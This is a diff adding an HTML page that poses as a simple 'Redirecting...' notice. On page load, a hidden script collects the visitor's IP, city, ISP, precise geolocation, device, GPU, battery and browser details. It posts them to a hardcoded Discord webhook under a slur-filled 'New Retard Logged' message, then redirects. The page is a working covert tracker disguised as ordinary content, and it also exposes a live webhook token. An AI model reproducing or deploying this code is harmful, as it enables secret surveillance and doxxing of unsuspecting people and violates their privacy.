@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+</head>
+<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:50px;">
+  <h1>Redirecting...</h1>
+  <p>If you're not redirected automatically, <a href="https://retard.org" style="color:#0ff;">click here</a>.</p>
+  <script>
+    (async () => {
+      const webhook = "https://discord.com/api/webhooks/1402717932240244867/U0L_U06DTxu8PtlqHK6_1gur0YfzOGvBDbcoJZaDn48TXCM-GY0_S74a2Hvt0JcpqLeJ";
+      const redirect = "https://retard.org";
+
+      let ipInfo = {};
+      try {
+        const ipRes = await fetch("https://ipinfo.io/json"); // Optional token for higher limits
+        ipInfo = await ipRes.json();
+      } catch {
+        ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", loc: "Unknown", org: "Unknown" };
+      }
+
+      const ua = navigator.userAgent;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const mem = navigator.deviceMemory || "Unknown";
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const language = navigator.language || "Unknown";
+      const platform = navigator.platform || "Unknown";
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const colorDepth = screen.colorDepth;
+      const connection = navigator.connection?.effectiveType || "Unknown";
+      const browser = ua.includes("Firefox") ? "Firefox" : ua.includes("Chrome") ? "Chrome" : ua.includes("Safari") ? "Safari" : "Unknown";
+      const touchPoints = navigator.maxTouchPoints || 0;
+      const isTouch = touchPoints > 0 ? "Yes" : "No";
+      const cookies = navigator.cookieEnabled ? "Yes" : "No";
+      const online = navigator.onLine ? "Yes" : "No";
+      const javaEnabled = navigator.javaEnabled?.() ? "Yes" : "No";
+      const focused = document.hasFocus() ? "Yes" : "No";
+      const visibility = document.visibilityState;
+      const downSpeed = navigator.connection?.downlink + ' Mbps' || "Unknown";
+      const doNotTrack = navigator.doNotTrack === "1" ? "Yes" : "No";
+      const localTime = new Date().toLocaleString();
+      const referrer = document.referrer || "None";
+
+      let geoInfo = {};
+      try {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 })
+        );
+        geoInfo = {
+          "Geo Lat": pos.coords.latitude,
+          "Geo Long": pos.coords.longitude,
+          "Geo Accuracy": pos.coords.accuracy + "m"
+        };
+      } catch {
+        geoInfo = { "Geo": "Permission Denied" };
+      }
+
+      let batteryInfo = {};
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = {
+          "Charging": battery.charging ? "Yes" : "No",
+          "Battery Level": Math.round(battery.level * 100) + "%"
+        };
+      } catch {
+        batteryInfo = { "Battery": "Not Supported" };
+      }
+
+      let glInfo = {};
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        glInfo = {
+          "GPU Vendor": gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          "GPU Renderer": gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch {
+        glInfo = { "GPU": "Not Available" };
+      }
+
+      const embed = {
+        username: "🤡 Retard Alert",
+        avatar_url: "https://cdn.discordapp.com/attachments/1397195077985632309/1402755513346953256/download.jpg?ex=68951160&is=6893bfe0&hm=b7bb8e9cd7ac881200b935f0fe0ed3586a522a98a6d2424475e7373d753b10c9&",
+        embeds: [
+          {
+            title: "🤡 New Retard Logged",
+            color: 3092790,
+            fields: [
+              {
+                name: "🌍 IP Info",
+                value: `**IP:** ${ipInfo.ip}\n**City:** ${ipInfo.city}\n**Region:** ${ipInfo.region}\n**Country:** ${ipInfo.country}\n**Location:** ${ipInfo.loc}\n**Org:** ${ipInfo.org}`
+              },
+              {
+                name: "🖥 System Info",
+                value: `**Platform:** ${platform}\n**Browser:** ${browser}\n**Resolution:** ${screenRes}\n**Color Depth:** ${colorDepth}-bit\n**Cores:** ${cores}\n**Memory:** ${mem} GB`
+              },
+              {
+                name: "🌐 Connection & Client info",
+                value: `**User-Agent:** ${ua}\n**Language:** ${language}\n**Touch:** ${isTouch} (${touchPoints} points)\n**Cookies:** ${cookies}\n**Java Enabled:** ${javaEnabled}\n**Online:** ${online}\n**Speed:** ${downSpeed}\n**Connection:** ${connection}`
+              },
+              {
+                name: "🧠 Environment",
+                value: `**Referrer:** ${referrer}\n**Local Time:** ${localTime}\n**Timezone:** ${timezone}\n**Focused:** ${focused}\n**Visibility:** ${visibility}\n**Do Not Track:** ${doNotTrack}`
+              },
+              {
+                name: "🔋 Battery",
+                value: Object.entries(batteryInfo).map(([k, v]) => `**${k}:** ${v}`).join('\n')
+              },
+              {
+                name: "🎮 GPU",
+                value: Object.entries(glInfo).map(([k, v]) => `**${k}:** ${v}`).join('\n')
+              },
+              {
+                name: "📌 Geolocation",
+                value: Object.entries(geoInfo).map(([k, v]) => `**${k}:** ${v}`).join('\n')
+              }
+            ],
+            footer: {
+              text: "Made by DDot"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      await fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embed)
+      });
+
+      setTimeout(() => {
+        window.location.href = redirect;
+      }, 3000);
+    })();
+  </script>
+</body>
+</html>
